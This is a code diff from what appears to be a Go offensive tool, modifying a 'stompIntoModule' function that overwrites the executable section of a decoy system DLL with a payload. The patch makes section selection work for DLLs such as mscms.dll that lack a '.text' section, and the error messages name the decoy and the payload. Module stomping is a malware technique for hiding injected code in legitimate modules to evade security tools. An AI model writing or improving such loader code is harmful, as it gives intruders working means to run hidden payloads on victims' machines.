@@ -148,19 +148,31 @@ func stompIntoModule(data []byte, dllPath string, base uintptr) (*StompResult, e
 		textBase uintptr
 		textSize uintptr
 	)
+	// IMAGE_SCN_CNT_CODE=0x20, IMAGE_SCN_MEM_EXECUTE=0x20000000.
+	// System DLLs don't have to name their code section ".text" (mscms.dll
+	// doesn't) — select by characteristics, preferring a literal .text match.
+	const (
+		scnCntCode    uint32 = 0x00000020
+		scnMemExecute uint32 = 0x20000000
+	)
 	for i := uint16(0); i < numSections; i++ {
 		sec := sections + uintptr(i)*40 // sizeof(IMAGE_SECTION_HEADER)
 		name := *(*uint64)(unsafe.Pointer(sec))
-		// ".text\0\0\0" little-endian
-		if name != 0x00007865742e {
-			continue
+		charcs := *(*uint32)(unsafe.Pointer(sec + 36))
+		isExec := charcs&(scnCntCode|scnMemExecute) != 0
+		if name == 0x00007865742e { // ".text\0\0\0" little-endian — preferred
+			textBase = base + uintptr(*(*uint32)(unsafe.Pointer(sec + 12)))
+			textSize = uintptr(*(*uint32)(unsafe.Pointer(sec + 8)))
+			break
 		}
-		textBase = base + uintptr(*(*uint32)(unsafe.Pointer(sec + 12)))
-		textSize = uintptr(*(*uint32)(unsafe.Pointer(sec + 8)))
-		break
+		if isExec && textBase == 0 {
+			textBase = base + uintptr(*(*uint32)(unsafe.Pointer(sec + 12)))
+			textSize = uintptr(*(*uint32)(unsafe.Pointer(sec + 8)))
+			// keep scanning — a real .text may appear later
+		}
 	}
 	if textBase == 0 {
-		return nil, errors.New("ModuleStomp: decoy has no .text section")
+		return nil, errors.New("ModuleStomp: decoy has no executable section")
 	}
 	if textSize < uintptr(len(data)) {
 		return nil, fmt.Errorf("ModuleStomp: decoy .text (%d bytes) smaller than payload (%d bytes)", textSize, len(data))
